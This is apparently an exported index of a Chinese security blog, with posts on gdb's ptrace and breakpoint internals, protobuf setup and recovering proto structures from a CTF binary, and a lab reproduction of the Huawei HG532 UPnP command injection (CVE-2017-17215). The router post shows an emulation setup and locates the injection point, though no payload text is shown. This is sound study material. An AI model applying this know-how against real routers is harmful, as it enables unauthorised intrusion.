参考资料\n\nhttps://blog.csdn.net/Frankiehp/article/details/113615412\n\nhttps://blog.csdn.net/my___dream/article/details/90105844\n\nhttps://www.cnblogs.com/vipstone/p/16667239.html\n\n","tags":["HTTP","libmicrohttpd","计算机网络"],"categories":["web"]},{"title":"gdb调试原理","url":"/2024/08/16/gdb调试原理/","content":"\n# gdb调试原理\n\n用了这么久gdb了，想到竟然没有了解过gdb调试的原理，故在此记录学习。\n\n<!-- toc -->\n\n## gdb与被调试程序的关系\n\n```shell\ngdb ./file\n```\n\n在我们使用上述指令启动gdb调试一个程序，最终进入调试界面等待用户输入gdb命令的这个过程中，在操作系统中发生了一些复杂的事。\n\n首先系统会启动gdb进程，gdb进程会使用fork()系统调用创建一个子进程，这个子进程会做两件事，见下图：\n\n* 1、调用系统函数ptrace(PTRACE_TRACEME, [其他参数])；\n* 用execv加载并执行可执行程序file，这样被调试程序就在子进程中开始执行了\n\n![image-20240818144824375](gdb调试原理/image-20240818144824375.png)\n\n\n\n### ptrace函数\n\ngdb有强大的调试能力离不开ptrace系统调用函数，ptrace的函数原型如下：\n\n```c\n#include <sys/ptrace.h>\nlong ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);\n```\n\n先看看ptrace简介：\n\n![image-20240818150005550](gdb调试原理/image-20240818150005550.png)\n\n在简介中，**tracer**为调试程序，在gdb调试关系中对应的是gdb进程，**tracee**为被调试程序。\n\nptrace系统函数是Linux内核提供的一个用于进程跟踪的系统调用，通过它，gdb进程可以读写被调试进程的指令空间、数据空间、堆栈和寄存器的值，且**gdb进程接管被调试进程的所有信**号，系统向被调试进程发送的所有信号都会被gdb进程捕获到，这样一来被调试进程就被gdb控制了，达到调试的目的。\n\n<img src=\"gdb调试原理/image-20240818150431702.png\" alt=\"image-20240818150431702\" style=\"zoom:50%;\" />\n\n\n\n### gdb.attach是如何实现的？\n\n我们经常使用gdb.attach()的方式调试一个正在运行的进程，那么它的原理是什么呢？\n\n首先回到上面提到的ptrace函数，它的第一个参数是一个枚举类型的值，其中重要的有两个：`PTRACE_TRACEME`和`PTRACE_ATTACH`\n\n在上面的被调试程序从头开始执行的情况中，是子进程调用ptrace函数并使用`PTRACE_TRACEME`参数，表示请求让gdb调试自己。\n\n而对于要调试正在执行的进程B来说，需要在gdb这个父进程中调用ptrace函数，使用的是`PTRACE_ATTACH`参数。此时gdb会attach（绑定）到正在执行的进程B中，即gdb将进程B**收养成为自己的子进程**，那么对于进程B来说，它的操作等同于它自己进行了一次`PTRACE_TRACEME`操作。然后gdb进程会发送`SIG_STOP`信号给子进程B，子进程B接收到这个信号会暂停执行进入到`TASK_STOPED`状态，表示已经准备好被调试了。\n\n![image-20240818151803591](gdb调试原理/image-20240818151803591.png)\n\n因此，不论是调试一个新程序还是一个正在执行的进程，通过ptrace系统调用，最终的结果都是：gdb是父进程，被调试程序是子进程，gdb父进程接管子进程的所有信号，并可以查看、修改子进程的内部信息，包括堆栈和寄存器等。\n\n\n\n## gdb如何实现断点\n\n首先给定下面的程序test.c：\n\n```c\n#include <stdio.h>\n\nint main(int argc, char *argv[])\n{\n    int a = 1;\n    int b = 2;\n    int c = a + b;\n    printf(\"c = %d \\n\", c);\n    return 0;\n}\n```\n\n假设在gdb调试的过程中我们执行下面的断点指令：\n\n```gdb\n(gdb) break 5\n```\n\n![image-20240818153220233](gdb调试原理/image-20240818153220233.png)\n\n左边的代码对应右边的汇编指令，当执行断点指令break 5的时候，会执行下面的操作：\n\n* 将第5行源码对应的汇编代码存储到断点链表中\n* 将第5行源码对应的汇编代码处替换为INT3中断指令\n\n![image-20240818153532936](gdb调试原理/image-20240818153532936.png)\n\n然后当程序运行到INT3中断指令的时候，gdb会在断点链表中查找，发现链表中存储了这行对应的代码，说明这里被设置了断点，因此接下来执行2个操作：\n\n* 将INT3断点替换为断点链表中这行对应的代码\n* 将PC指针回退一步，即设置为指向被断点的那一行\n\n![image-20240818154029983](gdb调试原理/image-20240818154029983.png)\n\n那么这个时候下一条要执行的指令就是汇编指令的第10行，即源码第5行。从调试者的角度来看，效果就是程序在第5行的地方被断下来了，接下来就可以使用其他指令进行debug了。\n\n\n\n\n\n##### 参考资料\n\nhttps://www.cnblogs.com/sewain/articles/14131927.html\n\n\n\n","tags":["gdb"],"categories":["gdb"]},{"title":"protobuf的安装与使用","url":"/2024/08/01/protobuf的安装与使用/","content":"\n# protobuf的安装与使用\n\n<!-- toc -->\n\n关于protobuf，这里推荐一篇文章供参考学习：[深入二进制安全：全面解析Protobuf ](https://bbs.kanxue.com/thread-282203.htm)\n\n## 安装protobuf\n\n* 安装protobuf：\n\n```shell\n#在ubuntu22.04下\ngit clone -b v3.21.0 https://github.com/protocolbuffers/protobuf.git # 需要大于3.20，不然后面会出现依赖问题\nsudo apt-get install autoconf automake libtool curl make g++ unzip # 所需依赖\nsudo ./autogen.sh   # 生成配置脚本\nsudo ./configure    # 可选 --prefix=path ，默认路径为/usr/local/\nmake -j`nproc`          \nsudo make install \nprotoc --version    # 检查protoc是否安装成功\n```\n\n在完成上述过程后，如果出现报错：\n\n```shell\nprotoc: error while loading shared libraries: libprotoc.so.32: cannot open shared object file: No such file or directory\n```\n\n就执行下面的命令：\n\n```shell\nsudo ldconfig # refresh shared library cache.\n```\n\n\n\n* 安装protobuf-c：\n\n下载地址：https://github.com/protobuf-c/protobuf-c/tags\n\n从上面的地址中找最新版本的压缩包，然后再linux下解压，在项目目录下执行下面的命令：\n\n```shell\n./configure\nmake\nmake install\n```\n\n至此protobuf-c安装完成。\n\n\n\n检验安装情况：\n\n![image-20240813155200748](protobuf的安装与使用/image-20240813155200748.png)\n\n如果出现装好了protobuf还找不到libprotobuf.so.10的情况\n\n```shell\nerror while loading shared libraries: libprotobuf.so.10: cannot open shared object file: No such file or directory\n```\n\n就将下面这行加到环境变量中：\n\n*建议临时使用或者直接patch文件，直接放到环境变量配置文件里会造成其他影响，解决方法未知所以不推荐使用（*\n\n```zsh\nexport LD_LIBRARY_PATH=/usr/local/lib:$LD_LIBRARY_PATH\n```\n\n\n\n测试样例：\n\n样例来源：https://www.cnblogs.com/Anker/p/3416541.html\n\n编写一个学生信息的proto：\n\n```protobuf\n message Student\n{\n    required string id = 1;\n    required string name = 2;\n    required string gender = 3;\n    required int32  age = 4;\n    required string object = 5;\n    required string home_address = 6;\n    required string phone = 7;\n}\n```\n\n编译：\n\n```shell\nprotoc --c_out=./ student.proto\n```\n\n会生成student.pb-c.c 和 student.pb-c.h两个文件。student.pb-c.h文件内容如下所示：\n\n```c\n/* Generated by the protocol buffer compiler.  DO NOT EDIT! */\n/* Generated from: student.proto */\n\n#ifndef PROTOBUF_C_student_2eproto__INCLUDED\n#define PROTOBUF_C_student_2eproto__INCLUDED\n\n#include <protobuf-c/protobuf-c.h>\n\nPROTOBUF_C__BEGIN_DECLS\n\n#if PROTOBUF_C_VERSION_NUMBER < 1000000\n# error This file was generated by a newer version of protoc-c which is incompatible with your libprotobuf-c headers. Please update your headers.\n#elif 1005000 < PROTOBUF_C_MIN_COMPILER_VERSION\n# error This file was generated by an older version of protoc-c which is incompatible with your libprotobuf-c headers. Please regenerate this file with a newer version of protoc-c.\n#endif\n\n\ntypedef struct Student Student;\n\n\n/* --- enums --- */\n\n\n/* --- messages --- */\n\nstruct  Student\n{\n  ProtobufCMessage base;\n  char *id;\n  char *name;\n  char *gender;\n  int32_t age;\n  char *object;\n  char *home_address;\n  char *phone;\n};\n#define STUDENT__INIT \\\n { PROTOBUF_C_MESSAGE_INIT (&student__descriptor) \\\n    , NULL, NULL, NULL, 0, NULL, NULL, NULL }\n\n\n/* Student methods */\nvoid   student__init\n                     (Student         *message);\nsize_t student__get_packed_size\n                     (const Student   *message);\nsize_t student__pack\n                     (const Student   *message,\n                      uint8_t             *out);\nsize_t student__pack_to_buffer\n                     (const Student   *message,\n                      ProtobufCBuffer     *buffer);\nStudent *\n       student__unpack\n                     (ProtobufCAllocator  *allocator,\n                      size_t               len,\n                      const uint8_t       *data);\nvoid   student__free_unpacked\n                     (Student *message,\n                      ProtobufCAllocator *allocator);\n/* --- per-message closures --- */\n\ntypedef void (*Student_Closure)\n                 (const Student *message,\n                  void *closure_data);\n\n/* --- services --- */\n\n\n/* --- descriptors --- */\n\nextern const ProtobufCMessageDescriptor student__descriptor;\n\nPROTOBUF_C__END_DECLS\n\n\n#endif  /* PROTOBUF_C_student_2eproto__INCLUDED */\n```\n\n测试文件（代码有点长，要看下面的内容建议先折叠此段）：\n\n```c\n#include <stdio.h>\n#include <errno.h>\n#include <stdlib.h>\n#include <string.h>\n#include \"student.pb-c.h\"\n\n#define ID_LEN         11\n#define NAME_LEN       32\n#define GENDER_LEN     10\n#define OBJECT_LEN     20\n#define HOME_ADDR_LEN  96\n#define PHONE_LEN      12\n\nstatic int malloc_student_info(Student *stu) {\n    stu->id = (char*)malloc(ID_LEN);\n    if (!stu->id) {\n        goto FAILED;\n    }\n    stu->name = (char*)malloc(NAME_LEN);\n    if (!stu->name) {\n        goto FAILED;\n    }\n    stu->gender = (char*)malloc(GENDER_LEN);\n    if (!stu->gender) {\n        goto FAILED;\n    }\n    stu->object = (char*)malloc(OBJECT_LEN);\n    if (!stu->object) {\n        goto FAILED;\n    }\n    stu->home_address = (char*)malloc(HOME_ADDR_LEN);\n    if (!stu->home_address) {\n        goto FAILED;\n    }\n    stu->phone = (char*)malloc(PHONE_LEN);\n    if (!stu->phone) {\n        goto FAILED;\n    }\n    return 0;\nFAILED:\n    fprintf(stdout, \"malloc error.errno:%u,reason:%s\\n\",\n            errno, strerror(errno));\n    return -1;\n}\n\nstatic void free_student_info(Student *stu) {\n    if (stu->id) {\n        free(stu->id);\n        stu->id = NULL;\n    }\n    if (stu->name) {\n        free(stu->name);\n        stu->name = NULL;\n    }\n    if (stu->gender) {\n        free(stu->gender);\n        stu->gender = NULL;\n    }\n    if (stu->object) {\n        free(stu->object);\n        stu->object = NULL;\n    }\n    if (stu->home_address) {\n        free(stu->home_address);\n        stu->home_address = NULL;\n    }\n    if (stu->phone) {\n        free(stu->phone);\n        stu->phone = NULL;\n    }\n}\n\nstatic void set_student_info(Student *stu) {\n    const char *id = \"2013111011\";\n    const char *name = \"Anker\";\n    const char *gender = \"male\";\n    const char *object = \"computer\";\n    const char *address = \"shen zheng\";\n    const char *phone = \"0102345678\";\n\n    strncpy(stu->id, id, ID_LEN);\n    strncpy(stu->name, name, NAME_LEN);\n    strncpy(stu->gender, gender, GENDER_LEN);\n    stu->age = 23;\n    strncpy(stu->object, object, OBJECT_LEN);\n    strncpy(stu->home_address, address, HOME_ADDR_LEN);\n    strncpy(stu->phone, phone, PHONE_LEN);\n}\n\nvoid print_student_info(Student *stu) {\n    printf(\"id: %s\\n\", stu->id);\n    printf(\"name: %s\\n\", stu->name);\n    printf(\"age: %d\\n\", stu->age);\n    printf(\"gender:%s\\n\", stu->gender);\n    printf(\"object: %s\\n\", stu->object);\n    printf(\"home address: %s\\n\", stu->home_address);\n    printf(\"phone: %s\\n\", stu->phone);\n}\n\nint main() {\n    Student stu = STUDENT__INIT;\n    void *buf = NULL;\n    unsigned int len;\n    Student *msg = NULL;\n\n    if (malloc_student_info(&stu) == -1) {\n        exit(0);\n    }\n    set_student_info(&stu);\n\n    //get student packed size\n    len = student__get_packed_size(&stu);\n    printf(\"size of student info : %u\\n\", len);\n    buf = malloc(len);\n    //put student info pack to buf\n    student__pack(&stu, buf);\n\n    //unpack student info from buf\n    msg = student__unpack(NULL, len, buf);\n    print_student_info(msg);\n    //free msg\n    student__free_unpacked(msg, NULL);\n\n    free(buf);\n    free_student_info(&stu);\n\n    return 0;\n}\n```\n\n编译及测试：\n\n```shell\ngcc student.pb-c.c test.c -o test_stuent_protoc -lprotobuf-c\n./test_student_protoc \n```\n\n![测试运行结果](protobuf的安装与使用/image-20240813162104246.png)\n\n可以正常使用。\n\n\n\n### proto结构分析\n\n由student.pb-c.h中这句`extern const ProtobufCMessageDescriptor student__descriptor;`，在student.pb-c.c 中找到这个结构：\n\n```c\nconst ProtobufCMessageDescriptor student__descriptor =\n{\n  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,\n  \"Student\",\n  \"Student\",\n  \"Student\",\n  \"\",\n  sizeof(Student),\n  7,\n  student__field_descriptors,\n  student__field_indices_by_name,\n  1,  student__number_ranges,\n  (ProtobufCMessageInit) student__init,\n  NULL,NULL,NULL    /* reserved[123] */\n};\n```\n\n这个student__descriptor是ProtobufCMessageDescriptor类型的一个结构。\n\n#### ProtobufCMessageDescriptor分析\n\nProtobufCMessageDescriptor类型定义如下：\n\n```c\n/**\n * Describes a message.\n */\nstruct ProtobufCMessageDescriptor {\n\t/** Magic value checked to ensure that the API is used correctly. */\n\tuint32_t\t\t\tmagic;\n\n\t/** The qualified name (e.g., \"namespace.Type\"). */\n\tconst char\t\t\t*name;\n\t/** The unqualified name as given in the .proto file (e.g., \"Type\"). */\n\tconst char\t\t\t*short_name;\n\t/** Identifier used in generated C code. */\n\tconst char\t\t\t*c_name;\n\t/** The dot-separated namespace. */\n\tconst char\t\t\t*package_name;\n\n\t/**\n\t * Size in bytes of the C structure representing an instance of this\n\t * type of message.\n\t */\n\tsize_t\t\t\t\tsizeof_message;\n\n\t/** Number of elements in `fields`. */\n\tunsigned\t\t\tn_fields;\n\t/** Field descriptors, sorted by tag number. */\n\tconst ProtobufCFieldDescriptor\t*fields;\n\t/** Used for looking up fields by name. */\n\tconst unsigned\t\t\t*fields_sorted_by_name;\n\n\t/** Number of elements in `field_ranges`. */\n\tunsigned\t\t\tn_field_ranges;\n\t/** Used for looking up fields by id. */\n\tconst ProtobufCIntRange\t\t*field_ranges;\n\n\t/** Message initialisation function. */\n\tProtobufCMessageInit\t\tmessage_init;\n\n\t/** Reserved for future use. */\n\tvoid\t\t\t\t*reserved1;\n\t/** Reserved for future use. */\n\tvoid\t\t\t\t*reserved2;\n\t/** Reserved for future use. */\n\tvoid\t\t\t\t*reserved3;\n};\n```\n\n这里面有几个关键点：\n\n* 1. magic，这个值一般为**0x28AAEEF9**\n* 2. n_fields，关系到原始的message结构内有几条记录，比如上年的student__descripto中的n_fields为7，就说明student.proto里的message结构有7条记录。\n* 3. fields，这个指向message内所有记录类型组成的一个数组，可以借助此部分内容逆向分析message结构。\n\n#### fields结构体分析\n\nfields结构体源码：\n\n```c\nstruct ProtobufCFieldDescriptor {\n\t/** Name of the field as given in the .proto file. */\n\tconst char\t\t*name;\n\t/** Tag value of the field as given in the .proto file. */\n\tuint32_t\t\tid;\n\t/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */\n\tProtobufCLabel\t\tlabel;\n\t/** The type of the field. */\n\tProtobufCType\t\ttype;\n\t/**\n\t * The offset in bytes of the message's C structure's quantifier field\n\t * (the `has_MEMBER` field for optional members or the `n_MEMBER` field\n\t * for repeated members or the case enum for oneofs).\n\t */\n\tunsigned\t\tquantifier_offset;\n\t/**\n\t * The offset in bytes into the message's C structure for the member\n\t * itself.\n\t */\n\tunsigned\t\toffset;\n\t/**\n\t * A type-specific descriptor.\n\t *\n\t * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the\n\t * corresponding `ProtobufCEnumDescriptor`.\n\t *\n\t * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to\n\t * the corresponding `ProtobufCMessageDescriptor`.\n\t *\n\t * Otherwise this field is NULL.\n\t */\n\tconst void\t\t*descriptor; /* for MESSAGE and ENUM types */\n\t/** The default value for this field, if defined. May be NULL. */\n\tconst void\t\t*default_value;\n\t/**\n\t * A flag word. Zero or more of the bits defined in the\n\t * `ProtobufCFieldFlag` enum may be set.\n\t */\n\tuint32_t\t\tflags;\n\t/** Reserved for future use. */\n\tunsigned\t\treserved_flags;\n\t/** Reserved for future use. */\n\tvoid\t\t\t*reserved2;\n\t/** Reserved for future use. */\n\tvoid\t\t\t*reserved3;\n};\n```\n\n其中要注意的关键点有：\n\n* name： 变量名\n* id：序号（即在message结构体中的顺序）\n* label（在proto2语法中对应的是required、optional）\n* type：数据类型（string或者int64等），label和type都是枚举类型，占4字节。\n\n示例，这里截取了上面student.pb-c.c的 student__field_descriptors中的一部分，旨在展示结构体：\n\n```c\nstatic const ProtobufCFieldDescriptor student__field_descriptors[7] =\n{\n  {\n    \"id\",\n    1,\n    PROTOBUF_C_LABEL_REQUIRED,\n    PROTOBUF_C_TYPE_STRING,\n    0,   /* quantifier_offset */\n    offsetof(Student, id),\n    NULL,\n    NULL,\n    0,             /* flags */\n    0,NULL,NULL    /* reserved1,reserved2, etc */\n  },\n  {\n    \"name\",\n    2,\n    PROTOBUF_C_LABEL_REQUIRED,\n    PROTOBUF_C_TYPE_STRING,\n    0,   /* quantifier_offset */\n    offsetof(Student, name),\n    NULL,\n    NULL,\n    0,             /* flags */\n    0,NULL,NULL    /* reserved1,reserved2, etc */\n  },\n```\n\n关于ProtobufCType的定义如下：\n\n从上往下从0开始编号\n\n```c\ntypedef enum {\n\tPROTOBUF_C_TYPE_INT32,      /**< int32 */\n\tPROTOBUF_C_TYPE_SINT32,     /**< signed int32 */\n\tPROTOBUF_C_TYPE_SFIXED32,   /**< signed int32 (4 bytes) */\n\tPROTOBUF_C_TYPE_INT64,      /**< int64 */\n\tPROTOBUF_C_TYPE_SINT64,     /**< signed int64 */\n\tPROTOBUF_C_TYPE_SFIXED64,   /**< signed int64 (8 bytes) */\n\tPROTOBUF_C_TYPE_UINT32,     /**< unsigned int32 */\n\tPROTOBUF_C_TYPE_FIXED32,    /**< unsigned int32 (4 bytes) */\n\tPROTOBUF_C_TYPE_UINT64,     /**< unsigned int64 */\n\tPROTOBUF_C_TYPE_FIXED64,    /**< unsigned int64 (8 bytes) */\n\tPROTOBUF_C_TYPE_FLOAT,      /**< float */\n\tPROTOBUF_C_TYPE_DOUBLE,     /**< double */\n\tPROTOBUF_C_TYPE_BOOL,       /**< boolean */\n\tPROTOBUF_C_TYPE_ENUM,       /**< enumerated type */\n\tPROTOBUF_C_TYPE_STRING,     /**< UTF-8 or ASCII string */\n\tPROTOBUF_C_TYPE_BYTES,      /**< arbitrary byte sequence */\n\tPROTOBUF_C_TYPE_MESSAGE,    /**< nested message */\n} ProtobufCType;\n```\n\n由上述信息，可以分析与ProtobufCFieldDescriptor类型对应的结构来还原message结构体。\n\n\n\n## 使用python配合protobuf打包\n\n```shell\nprotoc --python_out=./ student.proto\n```\n\n打包模板：\n\n```python\nimport student_pb2.py\ndata = student_pb2.Student()#方法命名随.proto中结构体名称变化\ndata.id = '1'\ndata.name = '1'\ndata.gender = '1'\ndata.age = 114\ndata.object = '123123'\ndata.home_address = '1'\ndata.phone = '123123123'\ndata.SerializeToString()#序列化为bytes字节流\n```\n\n\n\n## 利用Pbtk提取proto结构\n\n使用pbtk工具可以直接提取程序中的proto结构，这样就方便生成python包然后进行解题。\n\n安装：\n\n```shell\nsudo apt install python3-pip git openjdk-9-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5\nsudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client\n\ngit clone https://github.com/marin-m/pbtk\ncd pbtk\n./gui.py\n```\n\n如果执行gui.py出现缺库的情况应该是上面的没有装好，再重新单独安装即可。\n\n```shell\nsudo apt-get install python3-pyqt5 \nsudo apt-get install python3-pyqt5.qtwebengine\n```\n\n可以直接用图形化界面提取proto结构：\n\n![](protobuf的安装与使用/image-20240813173605034.png)\n\n选第一个选项，然后选择from binary file，选择要分析的二进制文件。\n\n![](protobuf的安装与使用/image-20240813173701476.png)\n\n出现下面的提示说明提取成功：\n\n![](protobuf的安装与使用/image-20240813173725881.png)\n\n可以点右下角按钮打开目录查看还原的proto结构体。\n\n![proto结构体提取](protobuf的安装与使用/image-20240813173749823.png)\n\n\n\n## 通过逆向还原proto结构\n\n当使用pbtk无法成功提取proto结构的时候就需要自己通过逆向来还原proto结构了，下面是一个例子：`ciscn2024的ezbuf`\n\n首先通过查找magic找到protobuf结构体（alt+B查找二进制串）：\n\n<img src=\"protobuf的安装与使用/image-20240815145343952.png\" alt=\"image-20240815145343952\" style=\"zoom:67%;\" />\n\n找到如下结果：\n\n![image-20240815145429509](protobuf的安装与使用/image-20240815145429509.png)\n\n可以确认这就是protobuf结构体，通过下面的字符串可以分析得到这个消息结构体名称为heybro。接下来继续分析其他字段。\n\n![image-20240815145541109](protobuf的安装与使用/image-20240815145541109.png)\n\n> ida小技巧の快捷键D：通过D将不确定的数据类型转化为byte、word或dwrod等常见类型。\n\n先d一下让这些数据可读性强一点。\n\n可以看出这显然是ProtobufCFieldDescriptor类型的结构，比如第一个就是name为`whatcon`，id为1，label为3，type为0xF（即bytes）。以此类推，将后面的信息全部提取出来就是如下的proto结构体：\n\n```protobuf\nsyntax \"proto3\"\n\nmessage heybro {\n\tbytes whatcon = 1;\n\tsint64 whattodo = 2;\n\tsint64 whatidx = 3;\n\tsint64 whatsize = 4;\n\tuint32 whatsthis = 5;\n}\n```\n\n这样就通过逆向的方法还原了proto结构，就可以进行后面的操作了。\n\n\n\n###### 参考资料\n\nhttps://www.cnblogs.com/Anker/p/3416541.html\n\nhttps://www.siascert.cn/2024/07/27/4-Protobuf%E5%AD%A6%E4%B9%A0/\n","tags":["protobuf"],"categories":["pwn"]},{"title":"（CVE-2017-17215）华为HG532路由器漏洞复现","url":"/2024/07/20/（CVE-2017-17215）华为HG532路由器漏洞复现/","content":"\n# （CVE-2017-17215）华为HG532路由器漏洞复现\n\nkali网络配置出问题了最后用的ubuntu20.04复现的（\n\n##　配置ubuntu网络环境\n\n安装网络配置工具以支持后面配置网桥：\n\n```shell\napt-get install bridge-utils uml-utilities\nsysctl -w net.ipv4.ip_forward=1 # 启动ip转发\n```\n\n\n\n#### 修改ubuntu网络配置\n\n修改网卡配置文件：\n\n由于这个版本的ubuntu不再使用`/etc/network/interfaces`配置网络，而是使用netplan，因此这里的配置方式有些不同。\n\n首先修改`/etc/netplan/`目录下的yaml文件：\n\n```yaml\n# Let NetworkManager manage all devices on this system\nnetwork:\n  version: 2\n  renderer: NetworkManager\n  \nnetwork:\n  version: 2\n  renderer: networkd\n  ethernets:\n    lo:\n      dhcp4: no\n      addresses:\n        - \"127.0.0.1/8\"\n        \nnetwork:\n  version: 2\n  renderer: networkd\n  ethernets:\n    ens33:\n      dhcp4: yes\n      \nnetwork:\n  version: 2\n  renderer: networkd\n  bridges:\n    br0:\n      interfaces: [ens33]\n      dhcp4: yes\n      parameters:\n        stp: false\n        forward-delay: 4\n```\n\n然后用下面的命令应用这个网络配置：\n\n```shell\nsudo netplan apply\n```\n\n\n\n用ifconfig看看网卡状态，出现了br0并且分配了ip就说明应该是配置成功了：\n\n![image-20240809210529594](（CVE-2017-17215）华为HG532路由器漏洞复现/image-20240809210529594.png)\n\n\n\n#### 修改qemu网络接口启动脚本\n\n在qemu安装后，找到`/etc/qemu-ifup`，在其中写入如下配置：\n\n```config\n#!/bin/sh\necho \"Executing /etc/qemu-ifup\"\necho \"Bringing up $1 for bridge mode...\"\nsudo /sbin/ifconfig $1 0.0.0.0 promisc up\necho \"Adding $1 to br0...\"\nsudo /sbin/brctl addif br0 $1\nsleep 2\n```\n\n\n\n创建 `/etc/qemu/bridge.conf`，在这个文件中写入：`allow br0`，然后保存。\n\n\n\n## QEMU配置\n\n安装qemu：\n\n```shell\nsudo apt-get install qemu \nsudo apt-get install qemu-user-static\nsudo apt-get install qemu-system\n```\n\n该固件是**32位**大端序**mips**架构，还需要下载对应的内核以及其镜像文件。\n\n下载地址： https://people.debian.org/~aurel32/qemu/mips/\n\n需要的是其中的`vmlinux-2.6.32-5-4kc-malta`内核以及`debian_squeeze_mips_standard.qcow2`镜像文件\n\n\n\n用一个启动脚本来启动qemu虚拟机，避免多次操作带来的麻烦，脚本放在上面下载的内核同级目录下：\n\n```shell\n#!/bin/bash\nsudo qemu-system-mips \\\n    -M malta -kernel vmlinux-2.6.32-5-4kc-malta \\\n    -hda debian_squeeze_mips_standard.qcow2 \\\n    -append \"root=/dev/sda1 console=tty0\" \\\n    -net nic,macaddr=00:16:3e:00:00:01 \\\n    -net tap\n```\n\n\n\n![image-20240809205931902](（CVE-2017-17215）华为HG532路由器漏洞复现/image-20240809205931902.png)\n\n运行start.sh即可启动虚拟机，进入虚拟机后首先要修改它的网卡配置：\n\n将网卡配置文件中的eth0全部更改为eth1\n\n```shell\nnano /etc/network/interfaces\n```\n\n![image-20240809211709820](（CVE-2017-17215）华为HG532路由器漏洞复现/image-20240809211709820.png)\n\n保存后执行下面的命令启动网卡：\n\n*（在kali上就是死在这了，好像是dhcp服务出了问题，没找到解决方法，好在用ubuntu成功了）*\n\n```shell\nifup eth1\n```\n\n启动后eth1对应的ip就是这个虚拟机的ip：\n\n![image-20240809212035597](（CVE-2017-17215）华为HG532路由器漏洞复现/image-20240809212035597.png)\n\n\n\n接下来就要讲提取出来的固件文件系统拷贝到这个qemu虚拟机中，使用scp进行操作：\n\n```shell\nscp -r ./squashfs-root root@192.168.xxx.xxx:/root/\n```\n\n\n\n为了方便操作，我们可以使用ssh连接这个qemu虚拟机，这样就能直接在主机上的终端直接操作qemu了：\n\n```shell\nssh root@192.168.xxx.xxx\n```\n\n\n\n\n\n\n\n## 文件系统提取\n\n#### 依赖安装以及固件解压：\n\nbinwalk和sasquatch：\n\nkali自带\n\nubuntu需要自行安装\n\nbinwalk安装：\n\n```shell\nsudo apt install binwalk\n```\n\nsasquatch安装，sasquatch是必要的，不然binwalk提取固件的时候无法成功提取文件系统：\n\n```shell\ngit clone https://github.com/devttys0/sasquatch\ncd ./sasquatch\n./build.sh\n```\n\n注意需要安装一些依赖才行：\n\n```shell\n#g++\nsudo apt install g++\n# 如果直接安装不行的话可以指定某个版本比如下面这种\nsudo apt install g++-8 \nsudo apt install g++-10\n```\n\n```shell\nsudo apt-get install liblzma-dev liblzo2-dev zlib1g-dev\n```\n\n\n\n解压固件：\n\n```shell\nbinwalk -Me ./HG532eV100R001C02B015_upgrade_main.bin\n```\n\n解压后可以在squashfs-root中看到文件系统。\n\n![image-20240809211110705](（CVE-2017-17215）华为HG532路由器漏洞复现/image-20240809211110705.png)\n\n\n\n可以在bin目录里面找到存在漏洞的upnp文件，检查其文件信息以及保护状态：\n\n![image-20240809211323998](（CVE-2017-17215）华为HG532路由器漏洞复现/image-20240809211323998.png)\n\n![image-20240809211255330](（CVE-2017-17215）华为HG532路由器漏洞复现/image-20240809211255330.png)\n\n可以看到这是32位大端序mips架构文件，且没有任何保护。\n\n\n\n## 漏洞复现\n\n#### 分析漏洞\n\n这个漏洞的漏洞点在于其UPnP模块的实现上，这里简单介绍一下UPnP协议。\n\n简单来说UPnP模块实现的功能是在主机向NAT设备（路由器）发出端口映射请求的时候，NAT设备可以自动为主机分配端口并进行端口映射，而不用手动配置，也避免了端口冲突的发生。\n\n如果网关设备的upnp模块存在问题,同时防火墙配置不当的话，从WAN口去攻击路由器等等网关设备就会比较容易。对于HG532这款设备来说，使用upnp进行固件更新，而在固件更新的过程中存在命令注入漏洞，下面就对这个存在漏洞的upnp二进制文件进行分析。\n\n\n\n#### 分析漏洞文件\n\n由于存在的漏洞是命令注入，因此可以搜索system相关关键字来寻找漏洞点，当然也可以寻找漏洞报告中的相关关键字定位漏洞点。\n\n根据漏洞报告的字符串NewStatusURL查找：\n\n![image-20240919091725614](（CVE-2017-17215）华为HG532路由器漏洞复现/image-20240919091725614.png)\n\n发现在这个函数中存在命令注入，且没有堆命令进行任何检查，可以直接用`;`执行任意命令\n\n![image-20240919091809098](（CVE-2017-17215）华为HG532路由器漏洞复现/image-20240919091809098.png)\n\n#### 漏洞复现\n\n进入qemu虚拟机，将根目录改为从固件中提取的文件系统的目录\n\n```shell\ncd squashfs-root\nchroot . sh\n```\n\n接下来，根据官方报告，需要打开37215端口后才能启用UPnP服务，因此可以找一下包含37215的文件。\n\n```shell\ngrep -r 37215\n```\n\n![image-20240919092148973](（CVE-2017-17215）华为HG532路由器漏洞复现/image-20240919092148973.png)\n\n发现`/bin/mic`这个文件中存在该端口，推测运行这个文件可以启动UPnP的服务，因此先运行/bin/mic，然后监听37215端口是否打开，可能在运行mic文件后要等待一段时间才能连上37215端口。在启动UPnP服务后用exp就能执行rce了。\n\n\n\n#### rce演示：\n\n在ubuntu上运行脚本\n\n![image-20240809205603973](（CVE-2017-17215）华为HG532路由器漏洞复现/image-20240809205603973.png)\n\n![image-20240809205631947](（CVE-2017-17215）华为HG532路由器漏洞复现/image-20240809205631947.png)\n\n成功执行rce\n\n\n\n","tags":["pwn","mips","IOT"],"categories":["IOT"]},{"title":"2024ciscn pwn 复现","url":"/2024/05/23/2024ciscn-pwn-复现/","content":"\n\n# 2024ciscn pwn 复现\n\n<!-- toc -->\n\n## gostack\n\ngo语言程序的栈溢出。（go的反汇编真难读啊（恼））\n\n为了提高可读性先使用go_parser恢复文件的符号表\n\n> go_parser下载： \n>\n> ```shell\n> git clone git@github.com:0xjiayu/go_parser.git\n> ```\n>\n> 使用方法：将go_parser克隆下来后，打开IDA→左上角File→Script File→找到go_parser目录，选择go_parser.py，确认后就能自动恢复符号表了，如果中途出错了那就是其他问题了（\n\n<img src=\"2024ciscn-pwn-复现/image-20240526160103971.png\" alt=\"image-20240526160103971\" style=\"zoom:67%;\" />\n\n可以看到恢复符号表后的函数列表中出现了大量go的库函数，我们直接找主函数main_main\n\n<img src=\"2024ciscn-pwn-复现/image-20240526160235817.png\" alt=\"image-20240526160235817\" style=\"zoom:50%;\" />\n\n在main_main_func3中发现了输入提示：\n\n<img src=\"2024ciscn-pwn-复现/image-20240526162531351.png\" alt=\"image-20240526162531351\" style=\"zoom:50%;\" 